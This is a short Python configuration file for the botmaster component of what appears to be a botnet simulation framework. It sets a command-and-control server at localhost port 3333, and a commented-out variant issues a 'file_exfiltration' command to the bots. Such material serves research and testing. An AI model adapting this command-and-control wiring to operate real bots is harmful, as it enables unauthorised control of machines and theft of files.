import core.BotMaster

botmaster_desc = {
        'initial' : 'waiting',
        'start_action' : 'request_connect',
        'srv_addr':'127.0.0.1',
        # 'srv_addr':'10.0.0.0',
        'srv_port':3333,
        'request_timeout':10,
        }

class BotMaster(core.BotMaster.BotMasterManInput):
    def __init__(self, desc=botmaster_desc):
        core.BotMaster.BotMasterManInput.__init__(self, desc)

# from core.BotMaster import BotMasterOneCMD
# class BotMaster(BotMasterOneCMD):
#     def __init__(self, desc=botmaster_desc):
#         BotMasterOneCMD.__init__(self, desc,
#             '1234',
#             2,
#             1,
#             'event=file_exfiltration;')


